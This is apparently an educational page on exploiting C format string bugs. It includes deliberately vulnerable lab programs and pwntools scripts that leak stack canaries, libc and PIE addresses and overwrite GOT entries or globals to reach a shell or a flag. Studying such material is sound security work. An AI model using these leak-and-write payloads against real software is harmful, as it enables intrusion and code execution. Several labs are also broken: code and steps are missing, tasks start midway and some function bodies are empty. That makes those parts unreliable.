Format String Vulnerabilities

The Bug

// VULNERABLE — user controls the format string
printf(user_input);

// SAFE — user input is a parameter, not the format
printf("%s", user_input);

When user input is the format string, printf reads/writes stack memory as if the format specifiers had real arguments.

How printf Reads Arguments

System V ABI: printf(fmt, RSI, RDX, RCX, R8, R9, stack...)

After the 5 register arguments are consumed, printf walks up the stack. With more % specifiers than actual arguments, it reads local variables, saved registers, canaries, return addresses.

Reading Memory (Info Leak)

Format Specifiers

SpecifierAction
%pPrint pointer (hex with 0x prefix)
%xPrint hex (32-bit)
%lxPrint hex (64-bit)
%sDereference argument as pointer, print string at that address
%nWrite number of chars printed so far to address pointed by argument
%N$pDirect parameter access — print the Nth argument

Finding Your Input Offset

# Send recognizable pattern and find where it appears
Input: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Output: AAAAAAAA.0x7fff... ... 0x4141414141414141
                                ↑ your input at offset N
# Automated offset finder
from pwn import *
for i in range(1, 50):
    p = process('./vuln')
    p.sendline(f'AAAA%{i}$p'.encode())
    result = p.recvall()
    if b'0x41414141' in result:
        print(f'Format string offset: {i}')
        break
    p.close()

Leaking Specific Values

# Leak canary (typically at offset around 11-15 depending on binary)
payload = b'%11$p'  # adjust offset
p.sendline(payload)
canary = int(p.recvline(), 16)

# Leak return address (saved RIP)
payload = b'%13$p'
p.sendline(payload)
ret_addr = int(p.recvline(), 16)

# Leak libc address (look for 0x7f... addresses)
payload = b'%15$p'  # find offset with libc address
p.sendline(payload)
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243  # offset varies

Writing Memory (%n)

%n writes the number of characters printed so far to the address pointed to by the argument.

SpecifierWrite Size
%n4 bytes (int)
%hn2 bytes (short)
%hhn1 byte (char)
%ln8 bytes (long)

Manual Write

# To write 0x4011d6 to address 0x404018 (GOT[puts])
# Split into two 2-byte writes with %hn:
# Write 0x11d6 to 0x404018 (low 2 bytes)
# Write 0x0040 to 0x40401a (high 2 bytes)

target_lo = 0x404018
target_hi = 0x40401a
val_lo = 0x11d6  # 4566 decimal
val_hi = 0x0040  # 64 decimal

# Format: [addresses][padding+%hn][padding+%hn]
# Each address is 8 bytes, so first we print 16 bytes of addresses
payload  = p64(target_lo) + p64(target_hi)
# Now we've printed 16 chars, need to print (val_hi - 16) more, then %hn
payload += f'%{val_hi - 16}c%8$hn'.encode()  # write 0x0040 to target_hi
# Then print (val_lo - val_hi) more chars, then %hn
payload += f'%{val_lo - val_hi}c%7$hn'.encode()  # write 0x11d6 to target_lo

Lab 5: Leak Libc Address

Medium

Objective: Leak a libc address from the stack to calculate libc base and defeat ASLR.

// fmtlibc.c - gcc -o fmtlibc fmtlibc.c -no-pie

#include <stdlib.h>

Tasks:

  2. Run gdb ./fmtlibc, set breakpoint at printf, identify which offset holds __libc_start_main+XX

log.success(f'libc base: {hex(libc.address)}')

Lab 6: Leak PIE Base

Medium

Objective: Leak a code address from the stack to defeat PIE (Position Independent Executable).

// fmtpie.c - gcc -o fmtpie fmtpie.c -pie -fPIE
#include <stdio.h>
#include <stdlib.h>

void win() { system("/bin/sh"); }

int main() {
    char buf[128];
    while (1) {
        printf("fmt> ");
        fgets(buf, 128, stdin);
        printf(buf);
        printf("\n");
    }
}

Tasks:

  1. Dump stack — look for addresses starting with 0x55 or 0x56 (PIE text addresses)
  2. In GDB, identify the leaked address (e.g., __libc_csu_init or main+XX)
  3. Calculate PIE base: pie_base = leak - known_offset
  4. Now compute win() address: win_addr = pie_base + elf.symbols['win']
from pwn import *
elf = ELF('./fmtpie')
p = process('./fmtpie')
# Leak PIE address (adjust offset)
p.sendlineafter(b'fmt> ', b'%13$p')
leak = int(p.recvline().strip(), 16)
pie_base = leak - elf.symbols['main'] - 0x10  # adjust
elf.address = pie_base
log.success(f'PIE base: {hex(pie_base)}')

Lab 7: Write Small Value with %hhn

Easy

Objective: Use %hhn (single byte write) to set a variable to a specific value.

// fmthhn.c - gcc -o fmthhn fmthhn.c -no-pie -Wl,-z,norelro
#include <stdio.h>

int check = 0;

int main() {
    char buf[128];
    printf("check @ %p (current: 0x%x)\n", &check, check);
    printf("fmt> ");
    fgets(buf, 128, stdin);
    printf(buf);
    if (check == 0x42) {
        printf("\nSUCCESS! check = 0x42\n");
    } else {
        printf("\nFAILED: check = 0x%x (need 0x42)\n", check);
    }
}

Tasks:

  1. Find your input offset on the stack
  2. Place the address of check at that offset in your payload
  3. %hhn writes 1 byte = (chars printed so far) mod 256
  4. Need 0x42 = 66 chars printed before %hhn. Account for the 8-byte address already printed.
from pwn import *
elf = ELF('./fmthhn')
p = process('./fmthhn')
p.recvuntil(b'check @ ')
check_addr = int(p.recvuntil(b' ').strip(), 16)
offset = 6  # adjust
# 8 bytes for address already printed, need 66 total
payload = p64(check_addr) + f'%{66-8}c%{offset}$hhn'.encode()
p.sendlineafter(b'fmt> ', payload)

Lab 11: 64-bit Format String (Null Byte Issue)

Hard

Objective: Exploit a format string in 64-bit where addresses contain null bytes, requiring addresses at the end of the payload.

// fmt64.c - gcc -o fmt64 fmt64.c -no-pie -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>

void win() { system("/bin/sh"); }

int main() {
    char buf[256];
    while (1) {
        printf("fmt> ");
        fgets(buf, 256, stdin);
        printf(buf);
        puts("");
    }
}

Key Concept: In 64-bit, addresses like 0x0000000000404018 contain null bytes. printf stops at \x00, so placing addresses first truncates the format string.

Tasks:

  1. Put the format specifiers BEFORE the addresses in the payload
  2. Pad the specifiers to align addresses on an 8-byte boundary
  3. Calculate the offset where your addresses land on the stack
  4. Overwrite GOT[puts] with win()
from pwn import *
elf = ELF('./fmt64')
p = process('./fmt64')
offset = 6  # adjust
target = elf.got['puts']
win = elf.symbols['win']
# Addresses go AFTER the format specifiers
# Calculate padding so addresses are 8-byte aligned
writes = {target: win}
# fmtstr_payload handles this automatically:
payload = fmtstr_payload(offset, writes, write_size='short')
p.sendlineafter(b'fmt> ', payload)

Hard

Objective: Exploit a format string when output is NOT returned to you (e.g., logged to a file).

// fmtblind.c - gcc -o fmtblind fmtblind.c -no-pie -Wl,-z,norelro

CTF Challenges

Challenge 1: Leak the Secret

Easy

A program stores a secret password on the stack. Leak it using format strings.

// secret.c - gcc -o secret secret.c -no-pie
#include <stdio.h>
#include <string.h>

int main() {
    char password[16] = "s3cr3t_p4ss!";
    char input[64];
    printf("Login: ");
    fgets(input, 64, stdin);
    printf("Hello, ");
    printf(input);
    printf("\nPassword: ");
    char attempt[16];
    fgets(attempt, 16, stdin);
    attempt[strcspn(attempt, "\n")] = 0;
    if (strcmp(attempt, password) == 0) {
        printf("FLAG{format_string_leak}\n");
    }
    return 0;
}

The password is on the stack. Use %p format specifiers to dump stack values and find it. Convert the hex bytes back to ASCII (remember little-endian). Then enter the password on the second prompt.

Challenge 2: Write the Win

Medium

Overwrite a global variable using format string writes to unlock the flag.

// fmtwin.c - gcc -o fmtwin fmtwin.c -no-pie -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>

int authorized = 0;

int main() {
    char buf[128];
    printf("authorized @ %p\n", &authorized);
    printf("Input: ");
    fgets(buf, 128, stdin);
    printf(buf);
    if (authorized == 0x1337) {
        system("cat flag.txt");
    } else {
        printf("\nNot authorized (0x%x)\n", authorized);
    }
    return 0;
}

You need to write 0x1337 (4919 decimal) to the address of authorized. Use %hn (2-byte write). Place the address of authorized in your format string at your offset, then use %4919c%N$hn (adjusting for bytes already printed from the address).

Hard

Combine format string leak + GOT overwrite + libc one_gadget for a shell.

Iteration 3: Send x to break the loop — puts("Bye!") becomes system("Bye!"). Better: overwrite GOT[printf] and send /bin/sh.

Challenge 6: Blind Format String

Hard

// blindfmt.c - gcc -o blindfmt blindfmt.c -no-pie -Wl,-z,norelro

#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void prize() { execve("/bin/sh", NULL, NULL); }

Challenge 9: Overwrite __free_hook

Hard

Overwrite __free_hook with system(), then trigger free("/bin/sh") for a shell. (glibc < 2.34)

// freehook.c - gcc -o freehook freehook.c -no-pie -Wl,-z,norelro

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {

Challenge 11: Format String Race

Hard

A multi-threaded server has a format string bug. Exploit a TOCTOU race with format string writes.

// fmtrace.c - gcc -o fmtrace fmtrace.c -no-pie -Wl,-z,norelro -lpthread
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

int authorized = 0;

void *checker(void *arg) {
    sleep(2);
    if (authorized) {
        system("cat flag.txt");
    } else {
        printf("Access denied.\n");
    }
    return NULL;
}

int main() {
    pthread_t tid;
    pthread_create(&tid, NULL, checker, NULL);

    char buf[128];
    printf("authorized @ %p\n", &authorized);
    printf("Quick! fmt> ");
    fgets(buf, 128, stdin);
    printf(buf);  // race: write authorized before checker wakes up

    pthread_join(tid, NULL);
    return 0;
}

The checker thread sleeps for 2 seconds. You have that window to overwrite authorized to a non-zero value using the format string. Use %hhn to write any non-zero byte (e.g., 0x01) to the address of authorized. The binary prints the address for you. One-byte write: %1c%N$hhn with the address at offset N.

Challenge 12: Change Program Flow

Medium

// fmtflow.c - gcc -o fmtflow fmtflow.c -no-pie -Wl,-z,norelro

}
